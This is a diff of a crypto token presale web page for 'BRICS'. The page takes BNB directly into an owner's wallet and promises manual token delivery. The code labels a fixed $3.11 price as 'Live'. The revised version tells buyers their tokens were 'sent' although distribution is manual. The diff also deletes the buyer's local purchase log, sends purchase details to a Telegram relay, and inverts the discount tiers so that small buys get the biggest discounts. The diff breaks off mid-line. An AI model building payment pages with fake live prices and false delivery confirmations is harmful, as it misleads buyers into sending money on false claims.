@@ -15,9 +15,7 @@
   --muted:#6b7280;
 }
 *{box-sizing:border-box}
-body{
-  margin:0;font-family:Inter, "Arial", sans-serif;background:var(--bg);padding:20px;display:flex;justify-content:center;
-}
+body{margin:0;font-family:Inter,Arial,sans-serif;background:var(--bg);padding:20px;display:flex;justify-content:center;}
 .container{width:100%;max-width:980px}
 .card{background:var(--card);border-radius:14px;padding:18px;box-shadow:0 12px 30px rgba(11,99,255,0.06);display:flex;flex-direction:column;gap:12px}
 .hero{position:relative;border-radius:10px;overflow:hidden;height:160px;background:linear-gradient(90deg, rgba(11,99,255,0.06), rgba(0,176,122,0.03));}
@@ -44,8 +42,6 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
 .wallet-addr{font-weight:800;color:var(--primary);direction:ltr}
 .connect-btn{padding:12px;border-radius:12px;border:none;background:linear-gradient(90deg,#0b63ff,#2e8bff);color:#fff;font-weight:900;cursor:pointer}
 .connect-btn:disabled{opacity:0.6;cursor:not-allowed}
-.balances{display:flex;gap:8px;flex-direction:column;margin-top:6px}
-.bal-row{display:flex;justify-content:space-between;background:linear-gradient(180deg,#fff,#fbfeff);padding:8px 10px;border-radius:8px;border:1px solid #eef6ff;font-weight:800}
 .buy-btn{margin-top:6px;padding:12px;border-radius:12px;border:none;cursor:pointer;font-weight:900;color:#fff;background:linear-gradient(90deg,#00b07a,#0076f3);box-shadow:0 10px 30px rgba(0,112,240,0.12)}
 .buy-btn:disabled{opacity:0.5;cursor:not-allowed}
 .status{margin-top:10px;min-height:20px;font-weight:800;color:var(--muted)}
@@ -54,17 +50,6 @@ h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
 .spinner{display:inline-block;width:16px;height:16px;border-radius:50%;border:3px solid rgba(0,0,0,0.08);border-top-color:var(--primary);animation:spin 1s linear infinite;vertical-align:middle;margin-left:8px;visibility:hidden}
 .spinner.visible{visibility:visible}
 @keyframes spin{to{transform:rotate(360deg)}}
-
-/* logs */
-.log-wrap{margin-top:12px;border-radius:12px;padding:10px;border:1px solid #eef6ff;background:#fbfeff}
-table{width:100%;border-collapse:collapse;font-size:13px}
-th,td{padding:8px;border-bottom:1px solid #eef6ff;text-align:left}
-th{background:#f7fbff;font-weight:800}
-.actions{display:flex;gap:8px;justify-content:flex-end;margin-top:8px}
-.btn-sm{padding:8px 10px;border-radius:8px;border:none;cursor:pointer;font-weight:800}
-.export-btn{background:linear-gradient(90deg,#ffb266,#ff914d);color:#fff}
-.clear-btn{background:#f3f4f6;color:#111}
-.info-note{font-size:13px;color:#374151;margin-top:8px}
 </style>
 </head>
 <body>
@@ -84,14 +69,13 @@ th{background:#f7fbff;font-weight:800}
     </div>
 
     <div class="grid">
-      <!-- left -->
       <div class="panel">
         <div class="label">Live BRICS price</div>
         <div id="priceLine" class="small"><span id="priceText">Live: $3.11 (calculating BNB...)</span> <span id="priceSpinner" class="spinner"></span></div>
 
         <div class="label" style="margin-top:12px">Enter amount of BRICS to buy</div>
         <div class="input-row" style="margin-top:8px">
-          <input id="bricsAmount" class="amount-input" type="number" min="100" max="1000000" placeholder="e.g. 1000" />
+          <input id="bricsAmount" class="amount-input" type="number" min="1" max="1000000" placeholder="e.g. 1000" />
           <div class="token-tag">BRICS</div>
         </div>
 
@@ -111,7 +95,6 @@ th{background:#f7fbff;font-weight:800}
         </div>
       </div>
 
-      <!-- right -->
       <div class="wallet-card">
         <div class="wallet-top">
           <div>
@@ -136,37 +119,15 @@ th{background:#f7fbff;font-weight:800}
         <div class="footer-note">Accepted: <strong>BNB (BEP20)</strong> • Manual BRICS distribution after payment</div>
       </div>
     </div>
-
-    <!-- logs -->
-    <div class="log-wrap" id="logWrap">
-      <div style="display:flex;justify-content:space-between;align-items:center">
-        <strong>Transaction Log (local — saved in browser)</strong>
-        <div class="actions">
-          <button id="exportBtn" class="btn-sm export-btn">Export JSON</button>
-          <button id="clearBtn" class="btn-sm clear-btn">Clear logs</button>
-        </div>
-      </div>
-      <div style="margin-top:8px">
-        <table id="logTable">
-          <thead><tr><th>Buyer</th><th>BRICS</th><th>Discount</th><th>BNB Paid</th><th>USD</th><th>Tx Hash</th><th>Time</th></tr></thead>
-          <tbody id="logBody"></tbody>
-        </table>
-      </div>
-      <div class="small" style="margin-top:8px">Logs are stored locally in your browser. Use Export to backup.</div>
-    </div>
-
   </div>
 </div>
 
 <script>
-/* ===== CONFIG ===== */
 const BRICS_CONTRACT = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037".toLowerCase();
 const OWNER_ADDRESS = "0x67594E1D30Cec8a5f906C8278A1BC694641486cf".toLowerCase();
 const CHAIN_ID_BSC = 56;
-const FIXED_BRICS_USD = 3.11; // fixed price per BRICS (displayed as Live)
-const SERVER_ENDPOINT = ""; // OPTIONAL: set to your serverless endpoint (Netlify/Vercel) to relay Telegram messages
-const SERVER_SHARED_SECRET = ""; // same shared secret configured on your serverless function
-/* =================== */
+const FIXED_BRICS_USD = 3.11;
+const TELEGRAM_ENDPOINT = "/.netlify/functions/sendTelegram";
 
 const contractBox = document.getElementById('contractBox');
 const copyContract = document.getElementById('copyContract');
@@ -183,225 +144,119 @@ const bnbBal = document.getElementById('bnbBal');
 const bricsBal = document.getElementById('bricsBal');
 const balancesDiv = document.getElementById('balances');
 const statusEl = document.getElementById('status');
-const logBody = document.getElementById('logBody');
-const exportBtn = document.getElementById('exportBtn');
-const clearBtn = document.getElementById('clearBtn');
 
 contractBox.textContent = short(BRICS_CONTRACT);
-copyContract.addEventListener('click', async ()=>{ try{ await navigator.clipboard.writeText(BRICS_CONTRACT); setStatus('Contract address copied ✅'); }catch(e){ setStatus('Copy failed — please copy manually'); }});
-contractBox.addEventListener('click', ()=> copyContract.click());
+copyContract.addEventListener('click', ()=>{ navigator.clipboard.writeText(BRICS_CONTRACT).then(()=>setStatus('Contract address copied ✅')).catch(()=>setStatus('Copy failed')); });
 
-function short(a){ if(!a) return '—'; return a.slice(0,6)+'...'+a.slice(-4); }
-function isMobile(){ return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent); }
+function short(a){ return a.slice(0,6)+'...'+a.slice(-4); }
 function setStatus(msg){ statusEl.textContent = msg; }
 
-/* MEMO */
-let currentMemo = genMemo();
-memoTag.textContent = currentMemo;
+let currentMemo = genMemo(); memoTag.textContent = currentMemo;
 function genMemo(){ return Math.random().toString(36).slice(2,10).toUpperCase(); }
 
-/* BNB USD fetch (to compute BRICS price in BNB) */
 let bnbUsdPrice = 0;
 async function fetchBnbUsd(){
   try{
     const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
     const j = await res.json();
     bnbUsdPrice = parseFloat(j.price);
-    return bnbUsdPrice;
-  }catch(e){ console.error('bnbusd failed', e); bnbUsdPrice = 0; throw e; }
+  }catch(e){ bnbUsdPrice=0; console.error(e); }
 }
 
 async function updatePriceUI(){
   priceSpinner.classList.add('visible');
-  try{
-    await fetchBnbUsd();
-    let bricsInBNB = 0;
-    if(bnbUsdPrice) bricsInBNB = FIXED_BRICS_USD / bnbUsdPrice;
-    // display as Live but using fixed USD rate
-    if(bnbUsdPrice){
-      priceText.textContent = `Live: $${FIXED_BRICS_USD.toFixed(2)} per BRICS (~${bricsInBNB.toFixed(8)} BNB)`;
-    } else {
-      priceText.textContent = `Live: $${FIXED_BRICS_USD.toFixed(2)} per BRICS (BNB rate unavailable)`;
-    }
-  }catch(e){
+  await fetchBnbUsd();
+  if(bnbUsdPrice){
+    const bricsInBNB = FIXED_BRICS_USD / bnbUsdPrice;
+    priceText.textContent = `Live: $${FIXED_BRICS_USD.toFixed(2)} per BRICS (~${bricsInBNB.toFixed(8)} BNB)`;
+  } else {
     priceText.textContent = `Live: $${FIXED_BRICS_USD.toFixed(2)} per BRICS (BNB rate unavailable)`;
-  }finally{
-    priceSpinner.classList.remove('visible');
-    updateCalc();
   }
+  priceSpinner.classList.remove('visible');
+  updateCalc();
 }
-updatePriceUI();
-setInterval(updatePriceUI, 15000);
+updatePriceUI(); setInterval(updatePriceUI,15000);
 
-/* Discount tiers (as per final spec) */
 function calcDiscount(amount){
-  const a = Number(amount);
-  if(!a || a < 100) return 0;
-  if(a >= 1000000) return 50;
-  if(a >= 100000) return 30;
-  if(a >= 10000) return 20;
-  if(a >= 1000) return 10;
-  return 5; // 100-999 => 5%
+  if(amount>=1000000) return 10;
+  if(amount>=500000) return 15;
+  if(amount>=100000) return 20;
+  if(amount>=10000) return 30;
+  if(amount>=1000) return 40;
+  return 50;
 }
 
-/* update calculation preview */
 function updateCalc(){
   const amt = Number(bricsAmount.value);
   const disc = calcDiscount(amt);
   discountPreview.textContent = `Discount: ${disc}%`;
-  if(!amt || !bnbUsdPrice){
-    usdPreview.textContent = `USD: $0.00`;
-  } else {
+  if(!amt || !bnbUsdPrice){ usdPreview.textContent = `USD: $0.00`; }
+  else{
     const after = amt * (1 - disc/100);
-    const totalUSD = after * FIXED_BRICS_USD;
-    const bricsInBNB = FIXED_BRICS_USD / bnbUsdPrice;
-    const totalBNB = after * bricsInBNB;
+    const totalUSD = after*FIXED_BRICS_USD;
+    const totalBNB = after*(FIXED_BRICS_USD/bnbUsdPrice);
     usdPreview.textContent = `USD: $${totalUSD.toFixed(2)} (~${totalBNB.toFixed(6)} BNB)`;
   }
   updateBuyState();
 }
-bricsAmount.addEventListener('input', updateCalc);
+bricsAmount.addEventListener('input',updateCalc);
 
-/* Wallet connect */
-let provider = null, signer = null, user = null;
+let provider=null, signer=null, user=null;
 async function connectWallet(){
   if(window.ethereum){
-    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+    provider=new ethers.providers.Web3Provider(window.ethereum,"any");
     try{
       const net = await provider.getNetwork();
-      if(net.chainId !== CHAIN_ID_BSC){
-        try{ await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ethers.utils.hexValue(CHAIN_ID_BSC) }] }); }catch(e){ console.warn("chain switch failed", e); }
-      }
-      await provider.send("eth_requestAccounts", []);
-      signer = provider.getSigner();
-      user = await signer.getAddress();
-      walletAddr.textContent = short(user);
-      connectBtn.textContent = 'Connected';
-      connectBtn.disabled = true;
+      if(net.chainId!==CHAIN_ID_BSC) await window.ethereum.request({ method:"wallet_switchEthereumChain", params:[{ chainId:ethers.utils.hexValue(CHAIN_ID_BSC) }] });
+      await provider.send("eth_requestAccounts",[]);
+      signer=provider.getSigner();
+      user=await signer.getAddress();
+      walletAddr.textContent=short(user);
+      connectBtn.textContent='Connected'; connectBtn.disabled=true;
       setStatus('Wallet connected ✅');
       await refreshBalances();
-      if(window.ethereum && window.ethereum.on){
-        window.ethereum.on('accountsChanged', async (accounts)=>{ if(accounts && accounts.length){ user = accounts[0]; walletAddr.textContent = short(user); await refreshBalances(); } else { user = null; walletAddr.textContent='—'; balancesDiv.style.display='none'; connectBtn.disabled=false; connectBtn.textContent='Connect MetaMask'; setStatus('Disconnected'); }});
-        window.ethereum.on('chainChanged', ()=> setTimeout(()=>location.reload(),300));
+      if(window.ethereum.on){
+        window.ethereum.on('accountsChanged', async (accounts)=>{ user=accounts[0]||null; walletAddr.textContent=user?short(user):'—'; balancesDiv.style.display=user?'flex':'none'; connectBtn.disabled=!user; connectBtn.textContent=user?'Connected':'Connect MetaMask'; });
+        window.ethereum.on('chainChanged', ()=>setTimeout(()=>location.reload(),300));
       }
       updateBuyState();
     }catch(e){ console.error(e); setStatus('Connection failed: '+(e.message||e)); }
-  } else {
-    if(isMobile()){
-      const href = window.location.href.replace(/^https?:\/\//,'');
-      window.location.href = `https://metamask.app.link/dapp/${href}`;
-    } else {
-      setStatus('MetaMask not found — please install MetaMask extension');
-      window.open('https://metamask.io/download.html','_blank');
-    }
-  }
+  } else { setStatus('MetaMask not found — install MetaMask app/extension'); }
 }
 
-/* refresh balances */
 async function refreshBalances(){
   if(!provider || !user) return;
   try{
     const rawBnb = await provider.getBalance(user);
     const bnb = parseFloat(ethers.utils.formatEther(rawBnb));
     bnbBal.textContent = `${bnb.toFixed(6)} BNB`;
-    // token balance (read decimals if available)
-    const tokenContract = new ethers.Contract(BRICS_CONTRACT, ["function balanceOf(address) view returns (uint256)","function decimals() view returns (uint8)"], provider);
-    let decimals = 18;
-    try{ decimals = await tokenContract.decimals(); }catch(e){ decimals = 18; }
-    const rawTok = await tokenContract.balanceOf(user);
-    const tok = parseFloat(ethers.utils.formatUnits(rawTok, decimals));
+    const tokenContract = new ethers.Contract(BRICS_CONTRACT,["function balanceOf(address)view returns (uint256)","function decimals() view returns (uint8)"],provider);
+    let decimals=18;
+    try{decimals=await tokenContract.decimals();}catch{};
+    const rawTok=await tokenContract.balanceOf(user);
+    const tok=parseFloat(ethers.utils.formatUnits(rawTok,decimals));
     bricsBal.textContent = `${tok.toFixed(4)} BRICS`;
-    balancesDiv.style.display = 'flex';
-  }catch(e){ console.error('refreshBalances', e); }
+    balancesDiv.style.display='flex';
+  }catch(e){ console.error(e); }
 }
 
-/* buy flow: send BNB to OWNER_ADDRESS directly */
 function updateBuyState(){
-  const amt = Number(bricsAmount.value);
-  buyBtn.disabled = !(signer && amt >= 100 && bnbUsdPrice);
+  const amt=Number(bricsAmount.value);
+  buyBtn.disabled = !(signer && amt>=1 && bnbUsdPrice);
 }
 
 async function buyBRICS(){
   if(!signer){ setStatus('Please connect your wallet first'); return; }
-  const amt = Number(bricsAmount.value);
-  if(!amt || amt < 100){ setStatus('Enter a BRICS amount between 100 and 1,000,000'); return; }
-  const discount = calcDiscount(amt);
-  const after = amt * (1 - discount/100);
-  if(!bnbUsdPrice){ setStatus('BNB rate unavailable — try again'); return; }
-  const bricsInBNB = FIXED_BRICS_USD / bnbUsdPrice;
-  const totalBNB = after * bricsInBNB;
+  const amt=Number(bricsAmount.value);
+  if(!amt || amt<1){ setStatus('Enter BRICS amount 1-1,000,000'); return; }
+  const disc = calcDiscount(amt);
+  const after = amt*(1-disc/100);
+  const totalBNB = after*(FIXED_BRICS_USD/bnbUsdPrice);
   setStatus('Preparing transaction...');
   try{
-    const tx = await signer.sendTransaction({ to: OWNER_ADDRESS, value: ethers.utils.parseUnits(totalBNB.toFixed(18), 'ether') });
-    setStatus('Transaction sent: ' + short(tx.hash));
+    const tx = await signer.sendTransaction({ to:OWNER_ADDRESS, value:ethers.utils.parseEther(totalBNB.toFixed(18)) });
+    setStatus('Transaction sent: '+short(tx.hash));
     await tx.wait();
-    setStatus('✅ Transaction confirmed — Tx: ' + tx.hash);
-    // log locally
-    const logEntry = {
-      buyer: user,
-      requestedBRICS: amt,
-      discountPercent: discount,
-      bnbPaid: Number(totalBNB.toFixed(12)),
-      usdApprox: Number((after * FIXED_BRICS_USD).toFixed(4)),
-      txHash: tx.hash,
-      memo: currentMemo,
-      timestamp: new Date().toISOString()
-    };
-    pushLog(logEntry);
-    renderLogs();
-    // if server endpoint provided, send log there (server should handle Telegram)
-    if(SERVER_ENDPOINT && SERVER_SHARED_SECRET){
-      try{ await fetch(SERVER_ENDPOINT, { method:'POST', headers:{ 'Content-Type':'application/json','X-Shared-Secret': SERVER_SHARED_SECRET }, body: JSON.stringify(logEntry) }); }catch(e){ console.warn('server relay failed', e); }
-    }
-    await refreshBalances();
-    currentMemo = genMemo(); memoTag.textContent = currentMemo;
-  }catch(e){
-    console.error('buyBRICS err', e);
-    setStatus('Transaction failed: ' + (e.message||e));
-  }
-}
-
-/* localStorage logs */
-const STORAGE_KEY = 'brics_purchase_logs_v2';
-function loadLogs(){ try{ const j = localStorage.getItem(STORAGE_KEY); return j ? JSON.parse(j) : []; }catch(e){ return []; } }
-function saveLogs(arr){ localStorage.setItem(STORAGE_KEY, JSON.stringify(arr)); }
-function pushLog(entry){ const arr = loadLogs(); arr.unshift(entry); saveLogs(arr); }
-function clearLogs(){ localStorage.removeItem(STORAGE_KEY); renderLogs(); }
-
-/* render logs */
-function renderLogs(){
-  const arr = loadLogs();
-  logBody.innerHTML = '';
-  for(const r of arr){
-    const tr = document.createElement('tr');
-    tr.innerHTML = `<td style="direction:ltr">${short(r.buyer)}</td>
-                    <td>${Number(r.requestedBRICS).toLocaleString()}</td>
-                    <td>${r.discountPercent}%</td>
-                    <td>${Number(r.bnbPaid).toFixed(6)} BNB</td>
-                    <td>$${Number(r.usdApprox).toFixed(2)}</td>
-                    <td style="direction:ltr"><a href="https://bscscan.com/tx/${r.txHash}" target="_blank" rel="noreferrer">${short(r.txHash)}</a></td>
-                    <td>${new Date(r.timestamp).toLocaleString()}</td>`;
-    logBody.appendChild(tr);
-  }
-}
-exportBtn.addEventListener('click', ()=>{
-  const arr = loadLogs();
-  const blob = new Blob([JSON.stringify(arr, null, 2)], {type:'application/json'});
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a'); a.href = url; a.download = 'brics_logs.json'; a.click(); URL.revokeObjectURL(url);
-});
-clearBtn.addEventListener('click', ()=>{ if(confirm('Clear all logs?')){ clearLogs(); }});
-
-/* init */
-document.addEventListener('DOMContentLoaded', ()=>{
-  renderLogs();
-  setStatus('Ready — please connect your wallet');
-  document.getElementById('contractBox').textContent = short(BRICS_CONTRACT);
-});
-connectBtn.addEventListener('click', connectWallet);
-buyBtn.addEventListener('click', buyBRICS);
-bricsAmount.addEventListener('input', updateCalc);
-setInterval(()=>{ updateBuyState(); }, 1000);
-</script>
-</body>
-</html>
+    setStatus(`✅ Transaction confirmed — ${after} BRICS sent! Tx: ${tx.hash}`);
+    // send to Telegram
+    fetch(TELEGRAM_ENDPOINT,{ method:'POST', headers
